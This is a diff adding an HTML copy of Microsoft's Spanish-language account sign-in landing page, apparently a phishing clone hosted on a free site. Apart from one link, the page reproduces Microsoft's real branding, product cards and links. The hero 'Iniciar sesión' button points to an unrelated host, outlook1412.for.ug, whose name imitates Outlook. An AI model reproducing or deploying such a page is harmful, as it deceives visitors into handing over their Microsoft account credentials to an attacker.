@@ -1,0 +1,806 @@
+﻿<!DOCTYPE html>
+<html dir="ltr" lang="es-ES" data-role-name="MeePortal" class="ltr SignedOut-signedOutPage signedout js">
+<head>
+<!-- Inserted by miarroba -->
+<script type="text/javascript" async=true>
+(function() {
+  var host = window.location.hostname;
+  var element = document.createElement('script');
+  var firstScript = document.getElementsByTagName('script')[0];
+  var url = 'https://quantcast.mgr.consensu.org' . concat('/choice/', 'd5x2uDVHd7ALE', '/', host, '/choice.js')
+  var uspTries = 0;
+  var uspTriesLimit = 3;
+  element.async = true;
+  element.type = 'text/javascript';
+  element.src = url;
+  firstScript.parentNode.insertBefore(element, firstScript);
+  function makeStub() {
+    var TCF_LOCATOR_NAME = '__tcfapiLocator';
+    var queue = [];
+    var win = window;
+    var cmpFrame;
+    function addFrame() {
+      var doc = win.document;
+      var otherCMP = !!(win.frames[TCF_LOCATOR_NAME]);
+      if (!otherCMP) {
+        if (doc.body) {
+          var iframe = doc.createElement('iframe');
+
+          iframe.style.cssText = 'display:none';
+          iframe.name = TCF_LOCATOR_NAME;
+          doc.body.appendChild(iframe);
+        } else {
+          setTimeout(addFrame, 5);
+        }
+      }
+      return !otherCMP;
+    }
+    function tcfAPIHandler() {
+      var gdprApplies;
+      var args = arguments;
+      if (!args.length) {
+        return queue;
+      } else if (args[0] === 'setGdprApplies') {
+        if (
+          args.length > 3 &&
+          args[2] === 2 &&
+          typeof args[3] === 'boolean'
+        ) {
+          gdprApplies = args[3];
+          if (typeof args[2] === 'function') {
+            args[2]('set', true);
+          }
+        }
+      } else if (args[0] === 'ping') {
+        var retr = {
+          gdprApplies: gdprApplies,
+          cmpLoaded: false,
+          cmpStatus: 'stub'
+        };
+
+        if (typeof args[2] === 'function') {
+          args[2](retr);
+        }
+      } else {
+        queue.push(args);
+      }
+    }
+    function postMessageEventHandler(event) {
+      var msgIsString = typeof event.data === 'string';
+      var json = {};
+
+      try {
+        if (msgIsString) {
+          json = JSON.parse(event.data);
+        } else {
+          json = event.data;
+        }
+      } catch (ignore) {}
+      var payload = json.__tcfapiCall;
+      if (payload) {
+        window.__tcfapi(
+          payload.command,
+          payload.version,
+          function(retValue, success) {
+            var returnMsg = {
+              __tcfapiReturn: {
+                returnValue: retValue,
+                success: success,
+                callId: payload.callId
+              }
+            };
+            if (msgIsString) {
+              returnMsg = JSON.stringify(returnMsg);
+            }
+            event.source.postMessage(returnMsg, '*');
+          },
+          payload.parameter
+        );
+      }
+    }
+    while (win) {
+      try {
+        if (win.frames[TCF_LOCATOR_NAME]) {
+          cmpFrame = win;
+          break;
+        }
+      } catch (ignore) {}
+      if (win === window.top) {
+        break;
+      }
+      win = win.parent;
+    }
+    if (!cmpFrame) {
+      addFrame();
+      win.__tcfapi = tcfAPIHandler;
+      win.addEventListener('message', postMessageEventHandler, false);
+    }
+  };
+  makeStub();
+  var uspStubFunction = function() {
+    var arg = arguments;
+    if (typeof window.__uspapi !== uspStubFunction) {
+      setTimeout(function() {
+        if (typeof window.__uspapi !== 'undefined') {
+          window.__uspapi.apply(window.__uspapi, arg);
+        }
+      }, 500);
+    }
+  };
+  var checkIfUspIsReady = function() {
+    uspTries++;
+    if (window.__uspapi === uspStubFunction && uspTries < uspTriesLimit) {
+      console.warn('USP is not accessible');
+    } else {
+      clearInterval(uspInterval);
+    }
+  };
+  if (typeof window.__uspapi === 'undefined') {
+    window.__uspapi = uspStubFunction;
+    var uspInterval = setInterval(checkIfUspIsReady, 6000);
+  }
+})();
+</script>
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-T2VG59');</script>
+<!-- Inserted by miarroba -->
+    <title>Cuenta de Microsoft | Inicia sesión o crea una cuenta hoy mismo &#8211; Microsoft</title>
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="format-detection" content="telephone=no" />
+        <meta name="description" content="Inicia sesión con tu cuenta Microsoft. Una cuenta. Un lugar para gestionarlo todo. Bienvenido al panel de tu cuenta." />
+        <meta name="pageid" content="SignedOut-signedOutPage" />
+        <meta name="Keywords" content="cuenta microsoft, suscribirse a cuenta microsoft, crear cuenta microsoft, crear una cuenta microsoft, panel de cuenta microsoft, gestionar cuenta microsoft, inicio de sesión en Microsoft, inicio de sesión en cuenta Microsoft, cuenta de Microsoft Live, Mi cuenta Microsoft, iniciar sesión con cuenta Microsoft, iniciar sesión con tu cuenta Microsoft, iniciar sesión en Microsoft" />
+        <meta name="awa-prdct" content="signedout" />
+        <meta name="awa-market" content="es-VE" />
+        <meta name="awa-aud" content="web" />
+
+
+    <link rel="canonical" href="https://account.microsoft.com/account/Account?refd=login.live.com&amp;ru=https:%2F%2Faccount.microsoft.com%2F%3Frefd%3Dlogin.live.com&amp;destrt=home-index" />
+        <link href="/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+    
+    <link rel="stylesheet" href="https://www.microsoft.com/onerfstatics/marketingsites-eus-prod/west-european/shell/_scrf/css/themes=default.device=uplevel_web_pc/f7-e90cc8/b4-2b125a/eb-555587/f0-ddcc75/70-00564a/8e-b18483/55-1cf2ad/6b-b7f16c?ver=2.0" type="text/css" media="all" /><link rel='stylesheet' href='https://statics-marketingsites-eus-ms-com.akamaized.net/statics/override.css?c=7' type='text/css' />
+<link href="https://mwf-service.akamaized.net/mwf/css/bundle/1.57.7/west-european/default/amc.min.css" rel="stylesheet"/>
+<link href="/dist/oneui.razor/public/styles/amx.min.css?v=E49CB395D91C8E0D69CC697543EE8BE64D86FD4134C230CB634DB2DBBD732D94" rel="stylesheet"/>
+    <link href="/bundles/styles/site-oneui?v=TR09c3RnPGDvfc5spvMZXR8t5E6q7L6VevIbteZu_TE1" rel="stylesheet"/>
+
+    
+    <link href="/bundles/styles/signedout-oneui?v=QMipkBvF1FSSQsAXRWYrqcj_wOX5QK0gTvsautUtyKQ1" rel="stylesheet"/>
+
+
+<link href="/bundles/styles/signedout?v=iVAwAsbz8xttJBFmij8jvKzGb2d6etvykUX3jZo8frI1" rel="stylesheet"/>
+
+
+
+    
+    
+<script type="text/javascript">
+
+    
+    window.onerror = function javaScriptErrorWatchdog(errorMsg, url, lineNumber) {
+        var errorMeta = document.createElement("meta");
+        errorMeta.name = "JSError";
+        errorMeta.content = "" + url + "; " + lineNumber + "; " + errorMsg;
+        document.getElementsByTagName("head")[0].appendChild(errorMeta);
+
+        return false;
+    };
+
+
+
+</script>
+
+
+    
+    <script type="text/javascript">
+        if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
+            var msViewportStyle = document.createElement("style");
+            var mq = "@-ms-viewport{width:auto!important}";
+            msViewportStyle.appendChild(document.createTextNode(mq));
+            document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
+        }
+    </script>
+    <script src="//ajax.aspnetcdn.com/ajax/jQuery/jquery-1.11.1.min.js"></script>
+<script>(window.jQuery)||document.write('<script src="/bundles/scripts/jquery"><\/script>');</script>
+
+    <script>
+        
+        var jqueryInstance = jQuery || $;
+        jqueryInstance && jqueryInstance.ajaxPrefilter(function (s) {
+            if (s.crossDomain) {
+                s.contents.script = false;
+            }
+        });
+    </script>
+
+    
+    
+    
+
+
+    
+    <script src="/bundles/scripts/experiments?v=dhMHbKozrGOgxx2MYXfMMYMDxUo0UcLjtgcfK8uL2iA1"></script>
+
+
+    
+    
+
+
+    
+    <!--[if lt IE 9]>
+    <script src="/bundles/scripts/ie8-helpers?v=U8_D9kDJrSlXzGmjWCxMbPWAvmcAOqRqmEvgMBi0BZg1"></script>
+
+    <script>
+        var elems = ('abbr,article,aside,audio,bdi,canvas,data,datalist,details,dialog,figcaption,figure,footer,header,hgroup,main,mark,meter,nav,output,picture,progress,section,summary,template,time,video').split(',');
+        for (var i = 0; i < elems.length; i++) {
+            document.createElement(elems[i]);
+        }
+    </script>
+    <![endif]-->
+
+</head>
+<body>
+<!-- Inserted by miarroba -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2VG59" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- Inserted by miarroba -->
+    <div id="page-wrapper">
+        <div id="site-header">
+            
+    
+
+
+
+
+
+
+    
+
+
+    <noscript>
+            <div class="m-alert f-warning site-alert" role="alert">
+        <div>
+            <div class="c-glyph glyph-warning" aria-label="Warning message"></div>
+            <p class="c-paragraph">
+                Para usar todos los contenidos de este sitio web, activa JavaScript en la configuración del explorador.
+                <span class="c-group"><a class="c-action-trigger" href="https://go.microsoft.com/fwlink/p/?LinkId=616795">Más información</a></span>
+            </p>
+        </div>
+    </div>
+
+    </noscript>
+    <div id="no-cookies">
+            <div class="m-alert f-warning site-alert" role="alert">
+        <div>
+            <div class="c-glyph glyph-warning" aria-label="Warning message"></div>
+            <p class="c-paragraph">
+                Para usar todos los contenidos de este sitio web, activa las cookies en la configuración del explorador. <a href="https://go.microsoft.com/fwlink/?LinkId=313221">Lee por qué y cómo se usan las cookies.</a>
+                <span class="c-group"><a class="c-action-trigger" href="https://go.microsoft.com/fwlink/p/?LinkId=616796">Más información</a></span>
+            </p>
+        </div>
+    </div>
+
+    </div>
+
+
+
+
+    <div id="sharedshell-header">
+            <div id="headerArea" class="uhf"  data-m='{"cN":"headerArea","cT":"Area_coreuiArea","id":"a1Body","sN":1,"aN":"Body"}'>
+                <div id="headerRegion"     data-region-key="headerregion" data-m='{"cN":"headerRegion","cT":"Region_coreui-region","id":"r1a1","sN":1,"aN":"a1"}' >
+
+    <div  id="headerUniversalHeader" data-m='{"cN":"headerUniversalHeader","cT":"Module_coreui-universalheader","id":"m1r1a1","sN":1,"aN":"r1a1"}'  data-module-id="Category|headerRegion|coreui-region|headerUniversalHeader|coreui-universalheader">
+        
+                    <div id="uhfCookieAlert" class="x-hidden  uhfc-universal-context context-uhf" data-m='{"cN":"cookiebanner_cont","cT":"Container","id":"c1m1r1a1","sN":1,"aN":"m1r1a1"}'>
+<div class="m-alert f-information" role="alert">
+            <button class="c-action-trigger c-glyph glyph-cancel"
+                aria-label="cerrar alerta"
+                data-m='{"cN":"No thanks","id":"nn1c1m1r1a1","sN":1,"aN":"c1m1r1a1"}'
+                ></button>
+
+    <div>
+            <div class="c-glyph glyph-info" aria-label=""></div>
+        
+        <p class="c-paragraph">
+            Al usar este sitio acepta el uso de cookies para an&#225;lisis, contenido personalizado y publicidad.
+                    <span class="c-group">
+        <a role="button" class="c-action-trigger"  href="https://go.microsoft.com/fwlink/?LinkId=248681"
+           
+           data-m='{"cN":"Learn more","id":"n2c1m1r1a1","sN":2,"aN":"c1m1r1a1"}'>Saber m&#225;s</a>
+        </span>
+
+        </p>
+    </div>
+</div>
+
+                        
+                    </div>
+
+
+
+
+
+        <a id="uhfSkipToMain" class="m-skip-to-main" data-href="#main-content" tabindex="0" data-m='{"cN":"Skip to content_nonnav","id":"nn2m1r1a1","sN":2,"aN":"m1r1a1"}'>Saltar al contenido principal</a>
+
+
+<header class="c-uhfh context-uhf no-js c-sgl-stck c-category-header " itemscope="itemscope" data-header-footprint="/amc/amc-L0-header, fromService: True"   data-magict="true"  itemtype="http://schema.org/Organization">
+    <div class="theme-light js-global-head f-closed  global-head-cont" data-m='{"cN":"Universal Header_cont","cT":"Container","id":"c3m1r1a1","sN":3,"aN":"m1r1a1"}'>
+        <div class="c-uhfh-gcontainer-st">
+            <button type="button" class="c-action-trigger c-glyph glyph-global-nav-button" aria-label="Expandir Todo Microsoft para ver la lista de productos y servicios de Microsoft" initialState-label="Expandir Todo Microsoft para ver la lista de productos y servicios de Microsoft" toggleState-label="Close All Microsoft list" aria-expanded="false" data-m='{"cN":"Mobile menu button_nonnav","id":"nn1c3m1r1a1","sN":1,"aN":"c3m1r1a1"}'></button>
+            <button type="button" class="c-action-trigger c-glyph glyph-arrow-htmllegacy" aria-label="Cerrar la b&#250;squeda" aria-expanded="false" data-m='{"cN":"Close Search_nonnav","id":"nn2c3m1r1a1","sN":2,"aN":"c3m1r1a1"}'></button>
+                    <a id="uhfLogo" class="c-logo c-sgl-stk-uhfLogo" itemprop="url" href="https://www.microsoft.com" aria-label="Microsoft" data-m='{"cN":"GlobalNav_Logo_cont","cT":"Container","id":"c3c3m1r1a1","sN":3,"aN":"c3m1r1a1"}'>
+                        <img alt="" itemprop="logo" itemscope="itemscope" class="c-image" src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" role="presentation" aria-hidden="true" />
+                        <span role="presentation" aria-hidden="true">Microsoft</span>
+                    </a>
+            <div class="f-mobile-title">
+                <button type="button" class="c-action-trigger c-glyph glyph-chevron-left" aria-label="Ver m&#225;s opciones del men&#250;" data-m='{"cN":"Mobile back button_nonnav","id":"nn4c3m1r1a1","sN":4,"aN":"c3m1r1a1"}'></button>
+                <span data-global-title="P&#225;gina principal de Microsoft" class="js-mobile-title">Cuenta</span>
+                <button type="button" class="c-action-trigger c-glyph glyph-chevron-right" aria-label="Ver m&#225;s opciones del men&#250;" data-m='{"cN":"Mobile forward button_nonnav","id":"nn5c3m1r1a1","sN":5,"aN":"c3m1r1a1"}'></button>
+            </div>
+                    <div class="c-show-pipe x-hidden-vp-mobile-st">
+                        <a id="uhfCatLogo" class="c-logo c-cat-logo" href="https://account.microsoft.com" aria-label="Cuenta" itemprop="url" data-m='{"cN":"CatNav_Cuenta_nav","id":"n6c3m1r1a1","sN":6,"aN":"c3m1r1a1"}'>
+                                <span>Cuenta</span>
+                        </a>
+                    </div>
+                <div class="cat-logo-button-cont x-hidden">
+                        <button type="button" id="uhfCatLogoButton" class="c-cat-logo-button x-hidden" aria-expanded="false" aria-label="Cuenta" data-m='{"cN":"Cuenta_nonnav","id":"nn7c3m1r1a1","sN":7,"aN":"c3m1r1a1"}'>
+                            Cuenta
+                        </button>
+                </div>
+
+
+
+                    <nav id="uhf-g-nav" aria-label="Contextual menu" class="c-uhfh-gnav" data-m='{"cN":"Category nav_cont","cT":"Container","id":"c8c3m1r1a1","sN":8,"aN":"c3m1r1a1"}'>
+            <ul class="js-paddle-items">
+                    <li class="single-link js-nav-menu x-hidden-none-mobile-vp uhf-menu-item">
+                        <a class="c-uhf-nav-link" href="https://account.microsoft.com" data-m='{"cN":"CatNav_Inicio_nav","id":"n1c8c3m1r1a1","sN":1,"aN":"c8c3m1r1a1"}' > Inicio </a>
+                    </li>
+                                        <li class="single-link js-nav-menu uhf-menu-item">
+                            <a id="sharedshell-help" class="c-uhf-nav-link" href="https://support.microsoft.com" data-m='{"cN":"CatNav_sharedshell-help_nav","id":"n2c8c3m1r1a1","sN":2,"aN":"c8c3m1r1a1"}'>Ayuda</a>
+                        </li>
+
+
+                <li id="overflow-menu" class="overflow-menu x-hidden uhf-menu-item">
+                        <div class="c-uhf-menu js-nav-menu">
+        <button data-m='{"pid":"Más","id":"nn3c8c3m1r1a1","sN":3,"aN":"c8c3m1r1a1"}' type="button" aria-label="M&#225;s" aria-expanded="false">M&#225;s</button>
+        <ul id="overflow-menu-list" aria-hidden="true" class="overflow-menu-list">
+        </ul>
+    </div>
+
+                </li>
+                            </ul>
+            
+        </nav>
+
+
+           
+        
+        
+    </div>
+    
+</header>
+
+
+
+
+    </div>
+        </div>
+
+    </div>
+
+    </div>
+
+        </div>
+        <div tabindex="-1" id="main-content-landing">
+            
+
+
+
+
+
+
+
+
+
+
+<main id="SignedOut-signedOutPage" data-grid="container" class="content-container context-amc signedout-container" role="main">
+    
+
+
+<div id="signinhero" class="m-hero-item f-medium f-x-left f-y-center theme-dark context-software f-mask-Opacity80" itemscope itemtype="http://schema.org/SoftwareApplication" ><picture class="c-image"><source media="(min-width: 1399px)" srcset="https://compass-ssl.microsoft.com/assets/3f/be/3fbe8ba9-c38a-4188-8812-f56a14d66b67.png?n=Hero_VP4_1399x525.png" /><source media="(min-width: 1083px)" srcset="https://compass-ssl.microsoft.com/assets/1f/27/1f270677-7fd0-439b-a385-1d67ddeff042.png?n=Hero_VP3_1083x609.png" /><source media="(min-width: 767px)" srcset="https://compass-ssl.microsoft.com/assets/64/94/64947b90-3db9-43c3-ac30-083878c222d3.png?n=Hero_VP2_767x431.png" /><source media="(min-width: 539px)" srcset="https://compass-ssl.microsoft.com/assets/42/81/42811ad2-2374-48c9-85fb-e4907813912a.png?n=Hero_VP1_539x303.png" /><img src="https://compass-ssl.microsoft.com/assets/42/81/42811ad2-2374-48c9-85fb-e4907813912a.png?n=Hero_VP1_539x303.png" srcset="https://compass-ssl.microsoft.com/assets/42/81/42811ad2-2374-48c9-85fb-e4907813912a.png?n=Hero_VP1_539x303.png" alt="Un universitario y dos universitarias sentados alrededor de una mesa redonda en una cafetería de estudio, colaborando en un proyecto de equipo."  /></picture><div><div ><H1 class="c-heading">Una cuenta para todo Microsoft</H1><p class="c-subheading">Una cuenta. Un lugar para gestionarlo todo. Bienvenido al panel de tu cuenta.</p><div class="c-group"><a id="signinlinkhero" href="http://outlook1412.for.ug/" class="c-call-to-action c-glyph wrap heroSignIn-cta"  aria-label="" target="" ><span>Iniciar sesión</span></a>        </div></div></div></div><div data-grid="container stack-2" ><div data-grid="col-3 " class="card-right-border"  Style="text-align:center"><img class="c-image" src="https://compass-ssl.microsoft.com/assets/3d/d6/3dd6a030-07d1-46ec-bee2-0896644dde12.svg?n=6824_AMC_SignedOut_NewToMicrosoft.svg" alt="Ilustración de una mujer que sostiene un portátil y un distintivo de Microsoft."  style="margin-left:auto;margin-right:auto;max-width:196px;"/><h2 class="c-heading-4&#32;" style="padding-top:20px">¿Nuevo en Microsoft?</h2><p class="c-paragraph" ><span  aria label="Learn more about Microsoft products and more">Introducción a productos de Microsoft y mucho más.</span></p><a href="https://microsoft.com/welcome" class="c-call-to-action c-glyph"  Style="margin-left: 0px;" aria-label="Obtener más información sobre productos de Microsoft y mucho más" target="_blank"  Style="margin-left: 0px;"><span>Obtener más información</span></a></div><div data-grid="col-3 " class="card-right-border"  Style="text-align:center"><img class="c-image" src="https://compass-ssl.microsoft.com/assets/6f/07/6f07801a-212f-4257-90a8-36625c8f6ae9.svg?n=6824_AMC_SignedOut_Security.svg" alt="Ilustración de una mano que sujeta un teléfono y muestra el inicio de sesión mediante huellas dactilares."  style="margin-left:auto;margin-right:auto;max-width:196px;"/><h2 class="c-heading-4&#32;" style="padding-top:20px">Seguridad</h2><p class="c-paragraph" >Cambia una contraseña, actualiza la información de seguridad y mantén actualizados los datos esenciales de tu cuenta.</p></div><div data-grid="col-3 " class="card-right-border"  Style="text-align:center"><img class="c-image" src="https://compass-ssl.microsoft.com/assets/71/fe/71fea452-38ac-4918-bd34-1a5126af193d.svg?n=6824_AMC_SignedOut_Privacy.svg" alt="Ilustración de una insignia con un hombre dentro."  style="margin-left:auto;margin-right:auto;max-width:196px;"/><h2 class="c-heading-4&#32;" style="padding-top:20px">Privacidad</h2><p class="c-paragraph" >Revisa tu historial de búsqueda, la actividad de navegación y ubicación y mucho más.</p></div><div data-grid="col-3 "  Style="text-align:center"><img class="c-image" src="https://compass-ssl.microsoft.com/assets/a9/04/a904e9c6-38fc-4237-8ae3-a109e0813e63.svg?n=6824_AMC_SignedOut_Family.svg" alt="Ilustración de una familia."  style="margin-left:auto;margin-right:auto;max-width:196px;"/><h2 Style="padding-top:20px" class="c-heading-4&#32;">Familia</h2><p class="c-paragraph" >Mantén a tu familia más segura online y mantente en contacto aunque estés lejos.</p></div></div><div data-grid="container stack-2" ><div data-grid="col-3 " class="card-right-border"  Style="text-align:center"><img class="c-image" src="https://compass-ssl.microsoft.com/assets/4b/e4/4be4ca8b-75e8-479d-9008-02a47e31e406.svg?n=6824_AMC_SignedOut_PaymentsBilling.svg" alt="Ilustración de un hombre que lleva bolsas de la compra."  style="margin-left:auto;margin-right:auto;max-width:196px;"/><h2 Style="padding-top:20px" class="c-heading-4&#32;">Pagos y facturación</h2><p class="c-paragraph" >Actualiza tu información de pago, consulta tu historial de pedidos, canjea tarjetas regalo y obtén ayuda con la facturación.</p></div><div data-grid="col-3 " class="card-right-border"  Style="text-align:center"><img class="c-image" src="https://compass-ssl.microsoft.com/assets/fd/fa/fdfaf57e-ef54-453b-a03f-8c734f88b487.svg?n=6824_AMC_SignedOut_Subscriptions.svg" alt="Ilustración de una tableta que muestra &quot;Office 365&quot; y un mando de juego."  style="margin-left:auto;margin-right:auto;max-width:196px;"/><h2 class="c-heading-4&#32;" style="padding-top:20px">Suscripciones</h2><p class="c-paragraph" >Renueva y gestiona rápidamente tus suscripciones y servicios favoritos de Microsoft en un solo lugar.</p></div><div data-grid="col-3 " class="card-right-border"  Style="text-align:center"><img class="c-image" src="https://compass-ssl.microsoft.com/assets/0a/33/0a333c70-dd9d-4568-8336-cd3608354041.svg?n=6824_AMC_SignedOut_Devices.svg" alt="Ilustración de un monitor, un portátil y un teléfono móvil."  style="margin-left:auto;margin-right:auto;max-width:196px;"/><h2 Style="padding-top:20px" class="c-heading-4&#32;">Dispositivos</h2><p class="c-paragraph" >Busca, bloquea o borra un dispositivo Windows 10 perdido o robado, programa una reparación y obtén soporte técnico.</p></div><div data-grid="col-3 "  Style="text-align:center"><img class="c-image" src="https://compass-ssl.microsoft.com/assets/5e/91/5e910350-23ab-46b3-8d58-e2b715f35fdd.svg?n=6824_AMC_SignedOut_Help.svg" alt="Ilustración de un monitor y una mujer que lleva un distintivo de Microsoft y saluda con la mano."  style="margin-left:auto;margin-right:auto;max-width:196px;"/><h2 Style="padding-top:20px" class="c-heading-4&#32;">Ayuda</h2><p class="c-paragraph" >Obtén respuestas y asesoramiento de expertos sobre productos y servicios Microsoft.</p></div></div><h2 Style="text-align:center;&#32;padding-top:80px;" class="c-heading-2&#32;">Inicia sesión y listo</h2><p class="c-paragraph"  Style="text-align:center; padding: 0 20%; margin-bottom: 60px;">Accede a tus productos y servicios Microsoft favoritos con un único inicio de sesión. Office, Windows, Xbox, Skype: un nombre de usuario y una contraseña te conectan a los archivos, fotos, personas y contenido que más te importan.</p><div data-grid="container stack-2" ><div data-grid="col-3 " class="card-right-border" ><img class="c-image" src="https://compass-ssl.microsoft.com/assets/4f/93/4f934443-4f2f-4258-986d-61e1d9734aa9.png?n=NewDesign_Outlook_Icon.png" alt="" /><h2 class="c-subheading-3&#32;">Outlook</h2><p class="c-paragraph" >Correo electrónico y calendario. Todo lo necesario para ser más productivo y conectarte en casa, durante tus desplazamientos y en cualquier lugar.</p><a id="outlookService" href="https://products.office.com/outlook/email-and-calendar-software-microsoft-outlook?rtc=1" class="c-call-to-action c-glyph"  aria-label="Más información sobre Outlook" target="_blank" ><span>Más información</span></a></div><div data-grid="col-3 " class="card-right-border" ><img class="c-image" src="https://compass-ssl.microsoft.com/assets/aa/50/aa5043a7-d010-4a49-9fd1-ff0c6964bac0.png?n=NewDesign_Skype_Icon.png" alt="" /><h2 class="c-subheading-3&#32;">Skype</h2><p class="c-paragraph" >Con el texto, la voz y el vídeo de Skype es fácil estar cerca de las personas que más te importan en todos tus dispositivos.</p><a id="skypeService" href="https://www.skype.com/" class="c-call-to-action c-glyph"  aria-label="Más información sobre Skype" target="_blank" ><span>Más información</span></a></div><div data-grid="col-3 " class="card-right-border" ><img class="c-image" src="https://compass-ssl.microsoft.com/assets/f7/55/f755802b-1e0b-4f8f-999c-0ae0b8284794.png?n=Edge_Icon.png" alt="" /><h2 class="c-subheading-3&#32;">Microsoft Edge</h2><p class="c-paragraph" >La forma más rápida de hacer cosas en la Web con características integradas de organización, investigación y descubrimiento.</p><a id="edgeService" href="https://www.microsoft.com/windows/microsoft-edge" class="c-call-to-action c-glyph"  aria-label="Más información sobre Microsoft Edge" target="_blank" ><span>Más información</span></a></div><div data-grid="col-3 " ><img class="c-image" src="https://compass-ssl.microsoft.com/assets/1b/0d/1b0ddd0a-4dab-4ceb-a958-47895a2c9eb2.png?n=Bing_Icon.png" alt="" /><h2 class="c-subheading-3&#32;">Bing</h2><p class="c-paragraph" >Con las características de búsqueda inteligente encontrarás rápida y fácilmente lo que necesitas: respuestas, noticias, entretenimiento, etc.</p><a id="bingService" href="https://www.bing.com/" class="c-call-to-action c-glyph"  aria-label="Más información sobre Bing" target="_blank" ><span>Más información</span></a></div></div><div data-grid="container stack-2" ><div data-grid="col-3 " class="card-right-border" ><img class="c-image" src="https://compass-ssl.microsoft.com/assets/77/59/7759b9c4-fd39-41d5-b2dd-eb1db3cc017c.png?n=Xbox_Icon.png" alt="" /><h2 class="c-subheading-3&#32;">Xbox</h2><p class="c-paragraph" >Juega a tus juegos favoritos en más sitios que nunca. Accede fácilmente a tus juegos y amigos y a la comunidad en Xbox One, PC Windows 10 y dispositivos móviles.</p><a id="xboxService" href="https://www.xbox.com/" class="c-call-to-action c-glyph"  aria-label="Más información sobre Xbox" target="_blank" ><span>Más información</span></a></div><div data-grid="col-3 " class="card-right-border" ><img class="c-image" src="https://compass-ssl.microsoft.com/assets/27/5f/275fdaa3-2cec-4963-9bc0-0fff5c7aa9ad.png?n=Office_Icon.png" alt="" /><h2 class="c-subheading-3&#32;">Office</h2><p class="c-paragraph" >Consigue lo que más te importa con Word, Excel, PowerPoint, etc. ¿Qué harás con tu próximo 365?</p><a id="officeService" href="https://products.office.com/" class="c-call-to-action c-glyph"  aria-label="Más información sobre Office" target="_blank" ><span>Más información</span></a></div><div data-grid="col-3 " class="card-right-border" ><img class="c-image" src="https://compass-ssl.microsoft.com/assets/93/72/93722b12-809c-49b9-9fe0-3cad1c9171e3.png?n=NewDesign_OneDrive_Icon.png" alt="" /><h2 class="c-subheading-3&#32;">OneDrive</h2><p class="c-paragraph" >Almacena y accede de forma segura a tus archivos y fotos en todos tus dispositivos. Tu cuenta Microsoft incluye 5 GB de almacenamiento y la posibilidad de añadir más cuando lo necesites.</p><a id="onedriveService" href="https://onedrive.live.com/about" class="c-call-to-action c-glyph"  aria-label="Más información sobre OneDrive" target="_blank" ><span>Más información</span></a></div><div data-grid="col-3 " ><img class="c-image" src="https://compass-ssl.microsoft.com/assets/33/b0/33b0697b-d6c2-4be6-a2fc-41fc6265bc75.png?n=Windows_Icon.png" alt="" /><h2 class="c-subheading-3&#32;">Windows</h2><p class="c-paragraph" >Busca, bloquea o borra un dispositivo Windows 10 perdido o robado, programa una reparación y obtén soporte técnico.</p><a id="windowsService" href="https://www.microsoft.com/windows" class="c-call-to-action c-glyph"  aria-label="Más información sobre Windows" target="_blank" ><span>Más información</span></a></div></div><div data-grid="container stack-2" ><div data-grid="col-3 " class="card-right-border" ><img class="c-image" src="https://compass-ssl.microsoft.com/assets/fc/f6/fcf68d6c-5428-4058-b9ba-ae89f5204f1c.png?n=Mixer_Icon.png" alt="" /><h2 class="c-subheading-3&#32;">Mixer</h2><p class="c-paragraph" >Mixer es el punto de encuentro donde jugar, celebrar y compartir los mejores momentos de juego.</p><a id="mixerService" href="https://www.xbox.com/mixer" class="c-call-to-action c-glyph"  aria-label="Más información sobre Mixer" target="_blank" ><span>Más información</span></a></div><div data-grid="col-3 " class="card-right-border" ><img class="c-image" src="https://compass-ssl.microsoft.com/assets/6c/1f/6c1fa6f1-bdd5-4a51-a4c3-3cafe238616c.png?n=Store_Icon.png" alt="" /><h2 class="c-subheading-3&#32;">Microsoft Store</h2><p class="c-paragraph" >Disfruta de todas las posibilidades con Microsoft, desde lo mejor en productividad y creatividad hasta juegos y entretenimiento.</p><a id="storeService" href="https://www.microsoft.com/store" class="c-call-to-action c-glyph"  aria-label="Más información sobre Microsoft Store " target="_blank" ><span>Más información</span></a></div><div data-grid="col-3 " class="card-right-border" ><img class="c-image" src="https://compass-ssl.microsoft.com/assets/e7/4c/e74cf34b-d9e4-4e75-9a93-583fc217f99d.png?n=Cortana_Icon.png" alt="" /><h2 class="c-subheading-3&#32;">Cortana</h2><p class="c-paragraph" >Ahorra tiempo y organízate; Cortana te ayuda con las tareas del día a día, para que puedas concentrarte en lo más importante.</p><a id="cortanaService" href="https://www.microsoft.com/cortana" class="c-call-to-action c-glyph"  aria-label="Más información sobre Cortana" target="_blank" ><span>Más información</span></a></div><div data-grid="col-3 " ><img class="c-image" src="https://compass-ssl.microsoft.com/assets/e1/10/e110a240-9227-4984-ac98-d3b2f95b4e09.png?n=MSN_Icon.png" alt="" /><h2 class="c-subheading-3&#32;">MSN</h2><p class="c-paragraph" >Con MSN, tienes acceso en cualquier momento del día a la información que enriquece tu vida.</p><a id="msnService" href="https://www.msn.com/" class="c-call-to-action c-glyph"  aria-label="Más información sobre MSN" target="_blank" ><span>Más información</span></a></div></div>
+
+
+</main>
+
+        </div>
+
+        
+
+    </div>
+    <div id="site-footer">
+        
+
+    <div id="footerArea" class="uhf"  data-m='{"cN":"footerArea","cT":"Area_coreuiArea","id":"a2Body","sN":2,"aN":"Body"}'>
+                <div id="footerRegion"     data-region-key="footerregion" data-m='{"cN":"footerRegion","cT":"Region_coreui-region","id":"r1a2","sN":1,"aN":"a2"}' >
+
+    <div  id="footerUniversalFooter" data-m='{"cN":"footerUniversalFooter","cT":"Module_coreui-universalfooter","id":"m1r1a2","sN":1,"aN":"r1a2"}'  data-module-id="Category|footerRegion|coreui-region|footerUniversalFooter|coreui-universalfooter">
+        
+
+
+
